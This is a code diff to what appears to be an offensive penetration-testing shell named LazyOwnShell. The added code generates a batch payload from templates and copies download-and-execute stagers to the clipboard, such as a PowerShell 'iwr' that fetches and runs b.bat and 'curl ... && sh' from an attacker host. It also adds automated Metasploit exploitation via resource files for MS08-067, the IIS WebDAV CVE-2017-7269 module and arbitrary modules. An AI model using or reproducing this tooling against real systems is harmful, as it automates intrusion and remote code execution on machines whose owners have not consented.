@@ -2942,6 +2942,7 @@ class LazyOwnShell(Cmd):
         exploitalert(getnvd)
         getnvd = find_ps(line)
         packetstormsecurity(getnvd)
+        os.system(f"msfconsole -q -x \"search {line}; exit\"")
         return
 
     def do_wfuzz(self, line):
@@ -8955,6 +8956,7 @@ class LazyOwnShell(Cmd):
         path = os.getcwd()
         file = f"{path}/modules/run"
         wfile = f"{path}/sessions/win/lazybot.ps1"
+        bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
         files = f"{path}/modules/backdoor/server.c"
         if not check_lhost(lhost):
@@ -8977,7 +8979,9 @@ class LazyOwnShell(Cmd):
             return
         with open(wfile, 'r') as f:
             wcontent = f.read()
-
+        with open(bfile, 'r') as f:
+            bcontent = f.read()
+        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)    
         wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         server = f"cd modules && python3 lazyc2.py {lport}"
@@ -8987,15 +8991,21 @@ class LazyOwnShell(Cmd):
         
         with open("sessions/w", 'w+') as f:
             f.write(wcontent)
-        choice = input("    [!] choice target windows 1 or linux 2: (default: 1)") or '1'
+
+        with open("sessions/r.bat", 'w+') as f:
+            f.write(bcontent)
+        choice = input("    [!] choice target windows 1, linux 2, windows bat 3 : (default: 1)") or '1'
 
         if choice == '1':
             copy2clip(f"iwr -uri  http://{lhost}/w -OutFile w.ps1 ; .\\w.ps1")
         elif choice == '2':
             copy2clip(f"curl http://{lhost}/r -o r && sh r")
-        
+        elif choice == '3':
+            copy2clip(f"iwr -uri  http://{lhost}/b.bat -OutFile b.bat ; .\\b.bat")
+
         with open(filek, 'r') as f:
             content = f.read()
+
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/b.c", 'w+') as f:
             f.write(content)
@@ -12871,7 +12881,7 @@ class LazyOwnShell(Cmd):
             print_warn("RHOST and LHOST must be specified.")
             return
 
-        rc_file_path = "/tmp/rejetto_hfs_exec.rc"
+        rc_file_path = "/tmp/ms08_067_netapi.rc"
         with open(rc_file_path, "w") as file:
             file.write(f"""
             use exploit/windows/smb/ms08_067_netapi
@@ -12886,8 +12896,77 @@ class LazyOwnShell(Cmd):
         if os.path.exists(rc_file_path):
             os.remove(rc_file_path)
 
-        print_msg(f"Executed rejetto_hfs_exec exploitation on {rhost} with listener {lhost}.")
+        print_msg(f"Executed ms08_067_netapi exploitation on {rhost} with listener {lhost}.")
         return
+
+    def do_automsf(self, line):
+        """
+        Try to check if Vulnerable using the module passed by argument of lazyown example automsf exploit/windows/iis/iis_webdav_upload_asp to use in metasploit
+        :param line: Command line input that provides the LHOST and RHOST.
+        :type line: str
+        :returns: None
+        """
+
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        ultimo_elemento = line.split('/')[-1]
+
+        if not rhost or not lhost:
+            print_warn("RHOST and LHOST must be specified.")
+            return
+
+        rc_file_path = f"/tmp/{ultimo_elemento}.rc"
+        with open(rc_file_path, "w") as file:
+            file.write(f"""
+            use {line}
+            set RHOSTS {rhost}
+            set LHOST {lhost}
+            set LPORT {lport}
+            run
+            """)
+
+        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
+
+        if os.path.exists(rc_file_path):
+            os.remove(rc_file_path)
+
+        print_msg(f"Executed {ultimo_elemento} exploitation on {rhost} with listener {lhost}.")
+        return
+
+    def do_iis_webdav_upload_asp(self, line):
+        """
+        (CVE-2017-7269). Vulnerable using the module iis_webdav_upload_asp of metasploit
+        :param line: Command line input that provides the LHOST and RHOST.
+        :type line: str
+        :returns: None
+        """
+
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+
+        if not rhost or not lhost:
+            print_warn("RHOST and LHOST must be specified.")
+            return
+
+        rc_file_path = "/tmp/iis_webdav_upload_asp.rc"
+        with open(rc_file_path, "w") as file:
+            file.write(f"""
+            use exploit/windows/iis/iis_webdav_upload_asp
+            set RHOSTS {rhost}
+            set LHOST {lhost}
+            set LPORT {lport}
+            run
+            """)
+
+        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
+
+        if os.path.exists(rc_file_path):
+            os.remove(rc_file_path)
+
+        print_msg(f"Executed iis_webdav_upload_asp exploitation on {rhost} with listener {lhost}.")
+        return      
 
     def do_nano(self, line):
         """
@@ -12954,6 +13033,7 @@ class LazyOwnShell(Cmd):
             f"{RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}"
         )
         return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
